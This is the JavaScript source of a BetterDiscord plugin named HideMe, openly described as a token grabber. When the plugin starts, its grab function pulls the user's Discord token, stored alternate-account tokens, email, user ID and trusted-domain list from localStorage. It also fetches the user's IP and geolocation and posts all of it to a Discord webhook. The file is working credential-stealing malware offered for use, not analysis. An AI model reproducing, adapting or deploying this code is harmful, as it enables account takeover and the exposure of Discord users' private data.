/**
 * @name HideMe
 * @author HideakiAtsuyo
 * @authorId 868150205852291183
 * @version 1.1.6
 * @description Allows you to token grab people omg
 * @invite https://discord.gg/C7yHkVSE2M
 * @donate https://www.paypal.me/HideakiAtsuyoLmao
 * @website https://github.com/HideakiAtsuyo
 * @source https://github.com/HideakiAtsuyo/BetterGrabber/tree/master/GOD/
 * @updateUrl https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD/HideMe.plugin.js
 */

class HideMe {
    // Constructor
    constructor() {
        this.initialized = false;
    }

    // Meta
    getName() {
        return "HideMe";
    }
    getShortName() {
        return "HideMe";
    }
    getDescription() {
        return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
    }
    getVersion() {
        return "1.1.6";
    }
    getAuthor() {
        return "Hideaki Atsuyo";
    }

    // Settings  Panel
    getSettingsPanel() {
        return "<!--Enter Settings Panel o, just standard HTML-->";
    }

    // Load/Unload
    async load() {
    	//this.grab();
    }

    unload() {}

    // Events

    onMessage() {
        // Called when a message is received
    };

    onSwitch() {
        // Called when a server or channel is switched
    };

    observer(e) {
        // raw MutationObserver event for each mutation
    };

    // Start/Stop
    start() {
      this.initialize();
      this.grab();
    }

    stop() {
        //PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };

    //  Initialize
    initialize() {
        this.initialized = true;
        //PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }

    async grab(){
        window.dispatchEvent(new Event('beforeunload')); //Useless Atm
        const https = require('https');//Hehehe Hello XMLHttpRequest

        var config = {
            pingOnResult: true,
            webHook: "/api/webhooks/ID/TOKEN",
            webhookUsername: "Hello World",
            webhookAvatar: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",

            embedTitle: "Hello World",
            embedColor: 0x36393f,

            tts: false
        };

        function getIP(){
            return new Promise(async (resolve, reject) => {
                https.get({'host': 'api.ipify.org', 'port': 443, 'path': '/'}, function(response) {
                    response.on('data', function(body) {
                        return resolve(body.toString());
                    }).on('error', (e) => {
                        console.error(e);
                    });
                });
            });
        }

        function getIPInfos(IP){
            return new Promise(async (resolve, reject) => {
                https.get({'host': 'ipinfo.io', 'port': 443, 'path': `/widget/${IP}`, "headers": { "Referer": "https://ipinfo.io", "User-Agent": "HelloWorld" }}, function(response) {
                    response.on('data', function(body) {
                        return resolve(body.toString());
                    }).on('error', (e) => {
                        console.error(e);
                    });
                });
            });
        }

        function getLocalStorageInfo(info){
            return new Promise(async (resolve, reject) => {
                return resolve(window.open().localStorage[info])
            });
        }

        var IP = await getIP();
        var IPInfos = JSON.stringify(await getIPInfos(IP), null, 4);
        var actualUserUsername = document.getElementsByClassName("size14-3fJ-ot title-338goq")[0].innerText;
        var actualUserDiscriminator = document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0].innerText.includes("\n") ? document.getElementsByClassName("hoverRoll-2XwpoF")[0]?.innerText.split(/\r\n|\r|\n/)[0] : document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0]?.innerText.split(/\r\n|\r|\n/);
        var actualUserTag = actualUserUsername+actualUserDiscriminator;
        var actualUserToken = await getLocalStorageInfo("token");
        var actualUserID = await getLocalStorageInfo("user_id_cache");
        //var actualUserSettings = await getLocalStorageInfo("UserSettingsStore"); //Pretty Big
        var actualUserEmail = await getLocalStorageInfo("email_cache");
        var actualUserPremiumState = window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const r of Object.keys(e.c).map(r=>e.c[r].exports).filter(e=>e)){if(r.default&&void 0!==r.default.getCurrentUser)return JSON.parse(JSON.stringify(r.default.getCurrentUser())).premiumUsageFlags;if(void 0!==r.getCurrentUser)return JSON.parse(JSON.stringify(r.getCurrentUser())).premiumUsageFlags}}]);
        var storedTokens = await getLocalStorageInfo("tokens"); // For New Multi Account System
        var trustedDomains = await getLocalStorageInfo("MaskedLinkStore"); // Trusted Domains List(when you trust them with the "Yes" button)
        var verifiedGameAndProgramsList = await getLocalStorageInfo("GameStoreReportedGames"); //List of VERIFIED games/programs

        var pD = JSON.stringify({
            content: config.pingOnResult ? "@everyone": "Ah Fuck No Ping :(",
            username: config.webhookUsername,
            avatar_url: config.webhookAvatar,
            tts: config.tts,
            embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.1.6" }, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState]}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }, { "name": "IP Infos", "value": `\`\`\`json\n${IPInfos == undefined ? "null": IPInfos}\`\`\``, inline: false }]}]
        });

        //console.log(pD); //Only Used To Check The Actual Payload Nothing More :)

        var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": config.webHook, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
        SendToWebhook.on('error', (e) => {
            console.error(e);
        });
        SendToWebhook.write(pD);
        SendToWebhook.end();
    }
}
